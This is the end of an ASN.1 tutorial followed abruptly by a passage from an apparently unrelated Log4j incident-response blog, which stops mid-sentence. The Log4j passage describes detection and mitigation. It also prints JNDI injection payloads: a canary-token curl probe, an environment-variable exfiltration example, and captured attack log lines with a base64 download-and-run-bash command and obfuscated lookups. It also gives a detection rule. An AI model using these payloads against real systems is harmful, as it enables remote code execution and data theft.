in\\n[Q.775](https://www.itu.int/rec/T-REC-Q.775-199706-I/en)\\n\\n```asn.1\\ncancelFailed ERROR ::= {\\n  PARAMETER\\n    SET {problem   [0]  CancelProblem,\\n         invokeId  [1]  present < TCInvokeIdSet\\n    }\\n}\\n```\\n\\n### SELECTION\\n\\nThe SELECTION type `<` is used when one want\'s to obtain one of the\\npossible subtypes of a `CHOICE` definition.\\n\\nIf we expand the previous example from the [SET](#set-of)\\n\\n```asn.1\\ncancel OPERATION ::= {\\n  ARGUMENT  present < TCInvokeIdSet\\n  ERRORS    {cancelFailed}\\n}\\n\\ncancelFailed ERROR ::= {\\n  PARAMETER\\n    SET {problem   [0]  CancelProblem,\\n         invokeId  [1]  present < TCInvokeIdSet\\n    }\\n}\\n```\\n\\nwe see that the `ARGUMENT` type and the invokeId field take the type\\nfrom the `present` field in the `TCInvokeIdSet` type.\\n\\nthe definition of `TCInvokeIdSet` is as follows\\n\\n```asn.1\\nInvokeId ::= CHOICE {present  INTEGER,\\n                     absent   NULL\\n}\\n\\nTCInvokeIdSet ::= InvokeId(WITH COMPONENTS {\\n                             present  (-128..127)\\n                           })\\n```\\n\\nThus `invokeId` and `ARGUMENT` fields will take integer values which\\nare between -128 and 127.\\n\\n# Other concepts\\n\\n## DEFAULT and OPTIONAL keywords\\n\\nOne can use the `DEFAULT` keyword in order to specify the default value.\\n\\n```asn.1\\nCollectedDigits ::= SEQUENCE {\\n  minimumNbOfDigits    [0] INTEGER (1..16) DEFAULT 1,\\n  maximumNbOfDigits    [1] INTEGER (1..16),\\n  endOfReplyDigit      [2] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  cancelDigit          [3] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  startDigit           [4] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  firstDigitTimeOut    [5] INTEGER (1..127) OPTIONAL,\\n  interDigitTimeOut    [6] INTEGER (1..127) OPTIONAL,\\n  errorTreatment       [7] ErrorTreatment DEFAULT stdErrorAndInfo,\\n  interruptableAnnInd  [8] BOOLEAN DEFAULT TRUE,\\n  voiceInformation     [9] BOOLEAN DEFAULT FALSE,\\n  voiceBack            [10] BOOLEAN DEFAULT FALSE\\n}\\n```\\n\\nIn this example we see the type `CollectedDigits` where most of the\\nvalues are either `DEFAULT` or `OPTIONAL`. The only value that needs\\nto be set is `maximumNbOfDigits`.\\n\\n## Classes\\n\\nOne can also use informal object classes in order to specify and\\ndefine values for general types.\\n\\n```asn.1\\nOPERATION ::= CLASS {\\n  &ArgumentType          OPTIONAL,\\n  &argumentTypeOptional  BOOLEAN OPTIONAL,\\n  &returnResult          BOOLEAN DEFAULT TRUE,\\n  &ResultType            OPTIONAL,\\n  &resultTypeOptional    BOOLEAN OPTIONAL,\\n  &Errors                ERROR OPTIONAL,\\n  &Linked                OPERATION OPTIONAL,\\n  &synchronous           BOOLEAN DEFAULT FALSE,\\n  &alwaysReturns         BOOLEAN DEFAULT TRUE,\\n  &InvokePriority        Priority OPTIONAL,\\n  &ResultPriority        Priority OPTIONAL,\\n  &operationCode         Code UNIQUE OPTIONAL\\n}\\nWITH SYNTAX {\\n  [ARGUMENT &ArgumentType\\n   [OPTIONAL &argumentTypeOptional]]\\n  [RESULT &ResultType\\n   [OPTIONAL &resultTypeOptional]]\\n  [RETURN RESULT &returnResult]\\n  [ERRORS &Errors]\\n  [LINKED &Linked]\\n  [SYNCHRONOUS &synchronous]\\n  [ALWAYS RESPONDS &alwaysReturns]\\n  [INVOKE PRIORITY &InvokePriority]\\n  [RESULT-PRIORITY &ResultPriority]\\n  [CODE &operationCode]\\n}\\n\\nprovideRoutingInformation OPERATION ::= {\\n  ARGUMENT  RequestArgument\\n  RESULT    RoutingInformation\\n  ERRORS\\n    {invalidCalledNumber | subscriberNotReachable | calledBarred |\\n      processingFailure}\\n  LINKED    {getCallingPartyAddress}\\n}\\n\\ngetCallingPartyAddress OPERATION ::= {\\n  RESULT  CallingPartyAddress\\n  ERRORS  {callingPartyAddressNotAvailable | processingFailure}\\n}\\n\\ninvalidCalledNumber ERROR ::= {CODE  local:1}\\nsubscriberNotReachable ERROR ::= {CODE  local:2}\\n\\nRequestArgument ::= SEQUENCE {\\n  calledNumber  IsdnNumber,\\n  basicService  BasicServiceIndicator OPTIONAL\\n}\\n\\nRoutingInformation ::= CHOICE {\\n  reroutingNumber    [0] IMPLICIT IsdnNumber,\\n  forwardedToNumber  [1] IMPLICIT IsdnNumber\\n}\\n\\n```\\n\\nIn the above `OPERATION` class, a syntax is defined for the\\nclass. This class and syntax can then be used to define specific\\nvalues, for instance the `provideRoutingInformation` and\\n`getCallingPartyAddress` values.\\n\\nWe also glimse another class in the above example which I didn\'t\\ninclude. Can you find it?\\n\\n## Parameterized components\\n\\nAnother way to make the specs more generalized is to use parameterized\\ncomponents. We\'ve already seen a couple of examples of such, see the\\nchapter for the [NULL](#null), [EXTERNAL](#external) and [SET\\n(OF)](#set-of) types.\\n\\nLet\'s look at the example from `SET OF` again.\\n\\n```asn.1\\nGenericNumbers {PARAMETERS-BOUND : bound} ::= SET SIZE(1..bound.&numOfGenericNumbers) OF GenericNumber {bound}\\n\\nGenericNumber {PARAMETERS-BOUND : bound} ::= OCTET STRING (SIZE(\\n    bound.&minGenericNumberLength .. bound.&maxGenericNumberLength))\\n```\\n\\n`GenericNumbers` take a parameter `bound` of the type `PARAMETERS-BOUND` as input.\\n\\n`PARAMETERS-BOUND` is defined as a class with a lot of different\\ninteger values, so I\'ve minimized the class a bit.\\n\\n```asn.1\\nPARAMETERS-BOUND ::= CLASS {\\n    --- a lot of other fields\\n    &minGenericNumberLength  INTEGER,\\n    &maxGenericNumberLength  INTEGER,\\n    &numOfGenericNumbers     INTEGER,\\n}\\n\\nWITH SYNTAX {\\n    --- a lot of other fields\\n    MINIMUM-FOR-GENERIC-NUMBER  &minGenericNumberLength\\n    MAXIMUM-FOR-GENERIC-NUMBER  &maxGenericNumberLength\\n    NUM-OF-GENERIC-NUMBERS      &numOfGenericNumbers\\n}\\n```\\n\\nOne could then specify different values using the `PARAMETERS-BOUND`\\nclass to reuse the `GenericNumber` and `GenericNumbers` types.\\n\\n```asn.1\\ncAPSpecificBoundSet PARAMETERS-BOUND ::= {\\n    --- again, lots of other values\\n    MINIMUM-FOR-GENERIC-NUMBER                  3\\n    MAXIMUM-FOR-GENERIC-NUMBER                  11\\n    NUM-OF-GENERIC-NUMBERS                      5\\n}\\n```\\n\\nIf one would pass `cAPSpecificBoundSet` to a value of type\\n`GenericNumbers`, it would define an instance which holds 1-5\\n`GenericNumber`s of 3-11 octets.\\n\\nQuite powerful if you have multiple definitions which uses similar\\nstructure.\\n\\n## Extensions\\n\\nSometimes you will need to support different versions of a protocol\\n(or someone else need to support different version, and you just need\\nto read the types of the protocol), and maybe the new version need to\\nextend some types in order to include more information. Then without\\nredefining everything and copy the previous version of the type to the\\nnew version of the type one can use extension markers (syntax `...`).\\n\\nTake the `QosMonitoringRequest` type below as an example. In the first\\nversion of the protocol (NGAP if you really want to know), the\\n`QoSMonitoringRequest` could take only enums `ul`, `dl`, or `both`.\\nHowever, in a subsequent version it was extended with a new enum\\n`stop`. With the extension marker `...` the v1-compilers can handle\\nthe first three enums, and the v2-compilers can handle all enums from\\nv1 but also the `stop` enum.\\n\\n```asn.1\\nQosMonitoringRequest ::= ENUMERATED {\\n    ul,\\n    dl,\\n    both,\\n    ...\\n} -- version 1\\n\\nQosMonitoringRequest ::= ENUMERATED {\\n    ul,\\n    dl,\\n    both,\\n    ...,\\n    stop\\n} -- version 2\\n```\\n\\nFor enums, if there is yet a newer version, say version 3 of this type\\none, you should just add the new enum under the previous enums.\\n\\n```asn.1\\nQosMonitoringRequest ::= ENUMERATED {\\n    ul,\\n    dl,\\n    both,\\n    ...,\\n    stop,\\n    half\\n} -- imaginary version 3\\n```\\n\\nFor `SEQUENCE`, `SET` and `CHOICE` one could either do the same, or to\\nkeep the versions separated, add another extension mark with the new\\nfields in between. One could also add version brackets to group the\\nextensions and highlight the differences.\\n\\n```asn.1\\nAx ::= SEQUENCE {\\n    a INTEGER (250..253),\\n    b BOOLEAN,\\n    c CHOICE {\\n        d INTEGER, -- version 1\\n        ...,\\n        [[\\n            e BOOLEAN,\\n            f IA5String\\n        ]],\\n        ... -- version 2\\n    },\\n    ..., -- version 1\\n    [[\\n        g NumericString (SIZE(3)),\\n        h BOOLEAN OPTIONAL\\n    ]],\\n    ..., -- version 2\\n    i BMPString OPTIONAL,  -- version 3\\n    j PrintableString OPTIONAL -- version 3\\n}\\n\\n```\\n\\nOnly the types `ENUMERATED`, `SEQUENCE`, `SET` and `CHOICE`, as well\\nas subtype constraints, and object and value sets can be extended.\\n\\n## Automatic, Implicit, Explicit tags\\n\\nWhen an value is transmitted all ambiguities need to be removed. That\\nis why every type needs to have an unique identifier, called a tag.\\n\\nThe section [DEFAULT and OPTIONAL\\nkeywords](#default-and-optional-keywords) has a good example I will\\nexplain.\\n\\n\\n```asn.1\\nCollectedDigits ::= SEQUENCE {\\n  minimumNbOfDigits    [0] INTEGER (1..16) DEFAULT 1,\\n  maximumNbOfDigits    [1] INTEGER (1..16),\\n  endOfReplyDigit      [2] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  cancelDigit          [3] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  startDigit           [4] OCTET STRING (SIZE (1..2)) OPTIONAL,\\n  firstDigitTimeOut    [5] INTEGER (1..127) OPTIONAL,\\n  interDigitTimeOut    [6] INTEGER (1..127) OPTIONAL,\\n  errorTreatment       [7] ErrorTreatment DEFAULT stdErrorAndInfo,\\n  interruptableAnnInd  [8] BOOLEAN DEFAULT TRUE,\\n  voiceInformation     [9] BOOLEAN DEFAULT FALSE,\\n  voiceBack            [10] BOOLEAN DEFAULT FALSE\\n}\\n```\\n\\nIn this sequence we can see that many of the values are optional and\\nsome have defaults, only the value `maximumNbOfDigits` is mandatory.\\n\\nWhen the sending side transmits a value of `CollectedDigits` type, the\\nreceiving side will get a sequence of the values mentioned. With\\nBER-encoding each defined value will have an identifier, a length (of\\nthe value transmitted) and the value. This is called a\\nTag-Length-Value or TLV for short.\\n\\nAll basic types already has an universal tag as stated in the [types\\ntable](#types), but the composite types does not. (If not tagged, how\\nwould it see the difference between `endOfReplyDigit`, `cancelDigit`\\nand `startDigit` in the example above?)\\n\\n```asn.1\\nRoutingInformation ::= CHOICE {\\n  reroutingNumber    [0] IMPLICIT IsdnNumber,\\n  forwardedToNumber  [1] IMPLICIT IsdnNumber\\n}\\n\\nIsdnNumber ::= SEQUENCE {\\n  typeOfAddress  TypeOfAddress,\\n  digits         TelephonyString\\n}\\n\\nTypeOfAddress ::= ENUMERATED {national(0), international(1), private(2)}\\n\\nTelephonyString ::=\\n  IA5String\\n    (FROM (\\"0\\" | \\"1\\" | \\"2\\" | \\"3\\" | \\"4\\" | \\"5\\" | \\"6\\" | \\"7\\" | \\"8\\" | \\"9\\" | \\"*\\" |\\n           \\"#\\"))(SIZE (1..15))\\n\\n```\\n\\nA value of `RoutingInformation` in this example will with BER encoding\\nonly transmit the tag `[0]` or `[1]` (and of course the length and\\nvalue). It counts on that the receiving part has the same version of\\nthe ASN.1 and knows the abstract syntax. If it wouldn\'t have been\\n`IMPLICIT`, then it would have sent either tags `[0]` or `[1]`\\nfollowed by the tags for `TypeOfAddress` (ENUMERATED) `[10]`, and tags\\nfor `TelephonyString` (IA5String) `[4]`.\\n\\nOne can specify `IMPLICIT` and `EXPLICIT` tagging on module basis,\\nwhere the `DEFINITIONS` are assigned.\\n\\n```asn.1\\nDEFINITIONS IMPLICIT TAGS ::= BEGIN\\n```\\n\\nInstead of writing all the tags self (explicitly in both cases), one\\ncan instead use the keywords `AUTOMATED TAGS`.\\n\\n```asn.1\\nDEFINITIONS AUTOMATIC TAGS ::= BEGIN\\n```\\n\\nThis will add tags to the composit types that doesn\'t have them\\n(explicitly) set.\\n\\n## Deprecations and discouragements\\n\\nSome things have been deprecated from earlier ASN.1 specifications,\\nand use of these are strongly discouraged.\\n\\n### ANY\\n\\nFirst out is the `ANY` type, which could take the form of any\\nvalue. It\'s like an unrestricted `CHOICE` type.\\n\\n```asn.1\\nInvoke ::= SEQUENCE {\\n    invokeID           InvokeIdType,\\n    linkedID       [0] InvokeIdType OPTIONAL,\\n    operationCode      MAP-OPERATION,\\n    parameter          InvokeParameter OPTIONAL\\n}\\nInvokeParameter ::= ANY\\n```\\n\\nProblem with this is that the ASN.1 compiler does not have a formal\\nway of knowing which values are approved. The use of `ANY` also\\nusually meant it was coupled with some other value, for instance the\\n`operationCode` in the example above.\\n\\nTo make this link one could have used `DEFINED BY` specifying which\\nfield the `ANY` type is coupled with. The drawback with this solution\\nis that it still has an ambiguous meaning, and the types are of no use\\nfor the application designer.\\n\\n```asn.1\\nExtensionField ::= SEQUENCE {\\n    type        INTEGER,\\n    --  shall identify the value of an EXTENSION type\\n    criticality ENUMERATED {\\n        ignore(0),\\n        abort(1)\\n    } DEFAULT ignore,\\n    value   [1] ANY DEFINED BY type\\n}\\n```\\n\\nInstead the concept of informal object classes and parameterized\\ncomponents were introduced.\\n\\n### Macros\\n\\nMacros were removed because they were poorly documented and too\\ngeneral. Because of this they were hard to implement and automate in\\nthe compilers. They follow the BNF notation.\\n\\n```asn.1\\nOPERATION MACRO ::=\\nBEGIN\\n    TYPE NOTATION ::= Parameter Result Errors LinkedOperations\\n    VALUE NOTATION ::= value (VALUE CHOICE { localValue INTEGER, globalValue OBJECT IDENTIFIER } )\\n    Parameter ::= ArgKeyword NamedType | empty\\n    ArgKeyword ::= \\"ARGUMENT\\" | \\"PARAMETER\\"\\n    Result ::= \\"RESULT\\" ResultType | empty\\n    Errors ::= \\"ERRORS\\" \\"{\\"ErrorNames\\"}\\" | empty\\n    LinkedOperations ::= \\"LINKED\\" \\"{\\"LinkedOperationNames\\"}\\" | empty\\n    ResultType ::= NamedType | empty\\n    ErrorNames ::= ErrorList | empty\\n    ErrorList ::= Error | ErrorList \\",\\" Error\\n    Error ::= value (ERROR)\\n             -- shall reference an error value\\n             | type\\n             -- shall reference an error type\\n             -- if no error value is specified\\n    LinkedOperationNames ::= OperationList | empty\\n    OperationList ::= Operation | OperationList \\",\\" Operation\\n    Operation ::= value (OPERATION)\\n                  -- shall reference an operation value\\n                  | type\\n                  -- shall reference an operation type if\\n                  -- no operation value is specified\\n    NamedType ::= identifier type | type\\nEND\\n```\\n\\nThe two needed fields of the macro are `TYPE NOTATION` and `VALUE\\nNOTATION`. The rest of the fields are the value sequence defining what\\nthe macro should insert. Quotes define the string to insert (excluding\\nthe actual quotes), `empty` inserts nothing. `identifier`, `value`, or\\n`type` are used to infer different things. Dubuisson has (yet again) a\\ngood chapter on this topic.\\n\\nAlso here one should use informal object classes and parameterized\\ncomponents instead of using macros.\\n\\n# Encodings\\n\\nThere are numerous codecs when transmitting the abstract syntax, all\\nwith different pros and cons.\\n\\n| Short name | Long name                    |\\n| ---------- | ---------------------------- |\\n| BER        | Basic encoding rules         |\\n| DER        | Distinguished encoding rules |\\n| CER        | Canonical encoding rules     |\\n| PER        | Packed encoding rules        |\\n| OER        | Octet encoding rules         |\\n| XER        | XML encoding rules           |\\n| EXER       | Extended XML encoding rules  |\\n| JER        | JSON encoding rules          |\\n\\n\\nBER is the oldest encoding rule for ASN.1. It uses Tag-Length-Value\\nformat where all tags, lengths and values are multiples of\\noctets. Because this was the first encoding rule it was named `basic`\\nto indicate that there might be more standardized encoding rules in\\nthe future.\\n\\nDER and CER are subsets of BER, which was added for developers of\\nX.400 email and X.500 directory applications. It provides means to\\nmake sure bit strings are not altered during transfer. The main\\ndifference between DER and CER is that DER uses a definite-length\\nformat and CER an indefinite-length format, so CER is best used for\\napplications that transfer a big amount of data.\\n\\nPER is the most compact format, and used for bandwith conservation. It\\ndoes not send the Tag of the TLV because the order in which components\\nof the message occur is known.  PER also does not send the Length of\\nthe TLV if the Value has a fixed length. It uses information from\\nASN.1 message description to eliminate redundant information from the\\nValue portion. It can either be aligned to multiple of octets by\\npadding each value with \'0\'s, or unaligned (U-PER/Unaligned PER) which\\nis more compact but take more time to decode.\\n\\nOER was adapted from PER and uses an octet oriented format, so the\\nlength of all specified Tags, Lengths, and Values are padded to be\\nmultiples of 8 bits octets as in BER. OER is usually faster than both\\nBER and PER with regards to encoding and decoding.\\n\\nXER, CXER and EXER are used for transmitting XML format. CXER is used\\nfor transmitting data canonically, e.g. used by security applications.\\nEXER or Extended XER is used when \\"stylish\\" features is wanted, and\\nadds possibility to extend the encoder for instance when wanting to\\ninsert processing instructions or comments into the XML.\\n\\nJER is used when transmitting JSON in accordance to the format\\nspecified in\\n[ECMA-404](https://www.ecma-international.org/publications-and-standards/standards/ecma-404/).\\n\\nThere are probably a bunch of others as well, but these are the ones\\nthat have a specification.\\n\\n| ITU-T number                                                                           | Name                                                                                                                                     |\\n| -------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |\\n| [X.690](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.690) | ASN.1 encoding rules: Specification of Basic Encoding Rules (BER), Canonical Encoding Rules (CER) and Distinguished Encoding Rules (DER) |\\n| [X.691](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.691) | ASN.1 encoding rules: Specification of Packed Encoding Rules (PER)                                                                       |\\n| [X.692](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.692) | ASN.1 encoding rules: Specification of Encoding Control Notation (ECN)                                                                   |\\n| [X.693](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.693) | ASN.1 encoding rules: XML Encoding Rules (XER)                                                                                           |\\n| [X.694](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.694) | ASN.1 encoding rules: Mapping W3C XML schema definitions into ASN.1                                                                      |\\n| [X.695](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.695) | ASN.1 encoding rules: Registration and application of PER encoding instructions                                                          |\\n| [X.696](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.696) | ASN.1 encoding rules: Specification of Octet Encoding Rules (OER)                                                                        |\\n| [X.697](https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&parent=T-REC-X.697) | ASN.1 encoding rules: Specification of JavaScript Object Notation Encoding Rules (JER)                                                   |\\n\\n# Final words\\n\\nCongratulations for making through this blog post.

We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation.\\n\\n\x3c!--truncate--\x3e\\n## Friday\\n\\nMitigating 3rd party vulnerabilities is an ability that **wgtwo** has prepared for. The first step in doing so is to assess the impact of the Log4j library across our microservice architecture.\\n\\nWe knew that all versions of Log4j `2.0-beta9 <= Apache log4j <= 2.14.1` were affected.\\n\\n### Code\\n\\nNaturally, the first place to look was our codebase and answer the question, do we have java microservices using log4j? Our core application code exists in a monorepo. Having a monorepo makes it easier as there is one place to look. In addition, we use bazel which helps for managing dependencies. After a quick scan through our repo, we found that we had a vulnerable version of log4j as a dependency, but was not used by a service. We cleaned this up and removed Log4j entirely.\\n\\n### Docker Vulnerability Scan Day 1\\n\\nWe use Trivy as our Docker vulnerability scanner. We have integrated this scanner as part of our docker image registry.\\n\\nAt a first pass, all scans were negative across our infrastructure and we thought we were in the clear. We later identified that this was a false positive as Trivy\u2019s database is only updated every 6 hours and did not include CVE-2021-44228 for around 48 hours after first identified.\\n\\n## Saturday\\n\\n### Checking our infrastructure ourselves with DNS requests\\n\\nAt that moment, we want to also evaluate ourselves if we are vulnerable. The early report of log4j exploitation showed that attackers were abusing the user-agent field of public endpoints, such as HTTP endpoints. Those endpoints are often logged using the Apache format, which exposes the user agent and the URL in the logs. In turn, those logs could be post-processed via a component using Log4j.\\n\\nOne harmless way to detect vulnerability is to exercise the JNDI resolver, that is to say, to have log4j perform the DNS request toward the java object. Thinkst folks are providing Canary Tokens service in a free tier fashion, and inside, there is a DNS token:\\n\\n![](/img/blog/log4j/01-canary-tokens.png)\\n\\nIf a DNS resolution is performed on the unique DNS hostname, we would get a callback or an email. After generating the token, we quickly proceed to probe our infrastructure:\\n\\n```\\ncurl https://docs.wgtwo.com  -A \\"\\\\${jndi:ldap://randomlygeneratedhostname.canarytokens.com/a}\\"\\n```\\n\\nAfter executing the command, we shortly received the notification from CanaryTokens. It means one of our elements of the infrastructure stack is relying on log4j. Nevertheless, we need to assess if the vulnerability is exploitable, so we check the Infosec literature.\\n\\nJNDI stands for Java Naming and Directory Interface - it is a system designed to look up for data and resources, i.e. such as Java bytecode. It might sound wrong to the 2021 engineers but back in 2000 Java RMI, CORBA etc were very trendy concepts for discovering and executing code in a dynamic fashion - think like Javascript or ActiveX applets in the browser world.\\n\\nGoing back to our problem, we quickly found this [Rogue JNDI](https://github.com/veracode-research/rogue-jndi). This is basically an exploit generator that creates a fake LDAP server, replying with Java class objects that will be executed by log4j on object retrieval.  After building a quick docker image, we ran this exploit on an external host and execute several calls to check all the proposed types of payload:\\n\\n![](/img/blog/log4j/02-supported-payloads.png)\\n\\nIn particular, RemoteReference did not yield to any execution, which means probably the JVM used to run the affected Java component is either too recent or not configured to execute code via known remote methods. This gives us some time, but we are still exposed to information leakage as an attacker can still exfiltrate env variables via DNS queries - i.e. log4j would resolve environment variables and would embed them in a query, such as:\\n\\n```\\n${jndi:ldap://${env:JAVA_VERSION}.dnsresolver.foo}\\n```\\n\\nThen, we should proceed to:\\n1) Identify if the affected components are in our stack or in the cloud provider\\n2) Apply mitigation\\n- Either via WAF - firewall rules on traffic.\\n- Either via known mitigation on the log4g components\\n  - Environment variable / JVM options\\n  - Java class removal\\n  - Full component upgrade\\n\\nFor (1), we started to observe all our log components and run network monitoring for a specific TCP flow on a controlled external host (i.e. running tcpdump toward a specific IP/port). We quickly noticed that a pod for one of DaemonSet was the culprit. This component was embedding logstash which is using Java and log4j.\\n\\nAssuming this was the only element, we proceed to apply mitigation:\\nWe discard the WAF approach as too complex and not providing enough coverage. We indeed saw later obfuscation of the `jndi:ldap` string used to trigger the vulnerability.\\nThe environment variable / JVM options were the quickest to deploy, but yielded no result. Later on, the Elastic Log4j CVE dedicated page mentioned that the mitigation was ineffective.\\nJava class removal consists of removing the Java class from the classpath so that the component will not be able to resolve resources dynamically. Thanks to the use of Docker image, we can simply alter the build recipe to perform the removal and redeploy the image. In a couple of minutes, we can deploy the new logstash component.\\n\\n### Log Analysis and Alerting\\n\\nJust after the zero-day was released, we identified an indicator of compromise (IoC) within our logs which is helpful for security forensics. `${jndi`\\n\\nCloudflare wrote a great [blog post](https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/) about the traffic they have seen when updating their firewall rules for preventing Log4j exploits.\\n\\nFor us, we wanted to achieve something similar and ensure that we can monitor our infrastructure from malicious actors probing our public infrastructure. We have centralized logging that acts as our Security Incident Event Monitoring (SIEM) solution. This is based on ElasticSearch, which by the way, was another service we needed to patch because of Log4j, identified by [AWS Security Bulletin](https://aws.amazon.com/security/security-bulletins/AWS-2021-006/).\\n\\nTo get some ChatOps alerts in slack we use an open-source tool called [Elstalert](https://github.com/Yelp/elastalert). This tool provides the ability to actively monitor and alert based on data within ElasticSearch. We use this for audit and security alerts within our applications and infrastructure.\\n\\nTo get started, we built the following Elastalert rule:\\n```yaml\\nlog4j.yaml: |-\\n  ---\\n  name: \\"log4j cve\\"\\n  index: logstash-*\\n  type: any\\n  realert:\\n    minutes: 15\\n  filter:\\n  - query:\\n    - query_string:\\n        query: \\"\\\\\\"jndi:ldap\\\\\\"\\"\\n  query_delay:\\n    minutes: 5\\n  query_key: \\"message\\"\\n  alert_text_type: alert_text_only\\n  include : [\\"kubernetes.container.name\\",\\"message\\"]\\n  alert:\\n  - \\"slack\\"\\n  alert_text: \\"\\n  *Container* : {0}\\\\n\\n  *Message* : {1}\\"\\n  alert_text_args: [\\"kubernetes.container.name\\",\\"message\\"]\\n  slack_channel_override: \\"#cve-2021-44228\\"\\n  slack_emoji_override: \\":unlock:\\"\\n  slack_msg_color: warning\\n  slack_title: Security RCE attempt for CVE-2021-44228\\n```\\nWe quickly then began to receive alerts of probing attempts across our environments.\\n\\n\\n![](/img/blog/log4j/03-elastalert.png)\\n\\nThe following alerts are **unsuccessful** exploit attempts our infrastructure.\\n\\nLet\u2019s take a closer look at some of these exploit attempts to see if we can learn anything..\\n\\n```bash\\n[2021-12-10T14:05:52.612 Z] \\"GET / HTTP/1.1\\" 307 - 0 0 0 - \\"45.155.205.233\\" \\"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==}\\" \\"34b61b2d-28f6-4e89-9baf-7cd3b4e71698\\" \\"54.217.173.83:443\\" \\"-\\"\\n```\\nThis request was hitting our public API gateway with a base64 encoded payload.

If this attack was successful we would have received an alert from our Host-based Intrusion Detection System (HIDs) from [Falco](https://github.com/falcosecurity/falco). In addition, it shows the importance of ensuring our images are distroless, without bash and OS dependencies, and blocking egress network traffic if possible, as this would also prevent such an attack.\\n\\nLooking at more attempts, we started to see probing attempts using a 3rd party service using [Interactsh](https://github.com/projectdiscovery/interactsh).\\n\\n```bash\\n16/Dec/2021:06:11:07 +0000] \\"GET /?x=${jndi:ldap://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com/a} HTTP/1.1\\" 302 0 \\"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}\\" \\"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}\\" 685 0.015 [products-developer-portal-8080] 100.98.133.224:8080 0 0.014 302 548d1132926fa0bc9904e12523d2f250 [${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}, 173.249.19.100]\\n```\\n\\nWe see a lot of requests calling DNS as a mechanism to detect if a system is vulnerable.\\n\\n```bash\\n[2021-12-14T22:57:36.722Z] \\"GET / HTTP/1.1\\" 307 - 0 0 0 - \\"51.105.55.17\\" \\"/${jndi:ldap://45.83.193.150:1389/Exploit}\\" \\"7c9223d6-2c81-491d-8564-10742cc90a9c\\" \\"54.75.196.220\\" \\"-\\"\\n```\\n\\nIn our Tokyo region, we started to see a lot of requests from `x00.it` domain.\\n\\n```bash\\n[14/Dec/2021:17:37:59 +0000] \\"GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_id.log4jdns.x00.it%2F%7D&page=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_page.log4jdns.x00.it%2F%7D&search=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_search.log4jdns.x00.it%2F%7D HTTP/1.1\\" 401 39 \\"${jndi:ldap://divd-0c1679670abeeb68eeabd98981713eea_${date:YYYYMMddHHmmss}_https_Referer.log4jdns.x00.it/}\\" \\"${jndi:ldap://divd-0c1679670abeeb68eeabd98981713eea_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}\\" 4496 0.255 [monitoring-mki-lab-grafana-80] 100.115.164.63:3000 39 0.001 401 d7fa702ee8cc73793707ca6720c57639 [194.5.73.6]\\n```\\n\\nIn the coming weeks we will continue to monitor the probes across our public infrastructure to see how they evolve.\\n\\n## Monday\\n\\n### Docker Vulnerability Scans\\n\\nNext, we wanted to ensure there was not an application running in our Kubernetes clusters with a vulnerable version of Log4j. We know from [this resource](https://github.com/cisagov/log4j-affected-db) that there are many open source applications that are vulnerable. To ensure we are not running a tool that is vulnerable, we used Kubernetes API with [kubectl](https://github.com/kubernetes/kubectl) and [Trivy](https://github.com/aquasecurity/trivy), a scanner for vulnerabilities in container images.\\n\\nFirst, we built a small POC to ensure that Trivy can identify the CVE-2021-44228.\\n\\n```bash\\n\u276f\u276f\u276f brew install aquasecurity/trivy/trivy\\n\u276f\u276f\u276f trivy image birdyman/log4j2-demo:1.0.0-12 | grep CVE-2021-44228\\n| org.apache.logging.log4j:log4j-api                     | CVE-2021-44228   | CRITICAL | 2.10.0            | 2.15.0                         | Remote code injection in Log4j                                                  |\\n```\\n\\nNow that we know Trivy works, let\u2019s create a small bash script to call Kubectl and Trivy and grep for the Log4j CVE.\\n\\n`trivy-scan-cve.sh CVE-2021-44228`\\n```bash\\n#!/usr/bin/env bash\\n\\nVULN=$1\\n\\necho \\"Scanning $1...\\"\\n\\nimgs=`kubectl get pods -A -o jsonpath=\'{range .items[*]}{.spec.containers[*].image}{\\" \\"}\' | tr \\" \\" \\"\\\\n\\" | sort -u`\\nfor img in ${imgs}; do\\n  echo \\"scanning ${img}\\"\\n  result=`trivy image --severity CRITICAL ${img}`\\n  if echo ${result} | grep -q \\"$1\\" ; then\\n    echo -e \\"${img} is vulnerable, please patch!\\"\\n  fi\\ndone\\n```\\n\\nWe ran the above script across all of our Kubernetes clusters. This was helpful as we then found some additional test services which included the vulnerable Log4j library. These vulnerable services were based on 3rd party open-source applications, 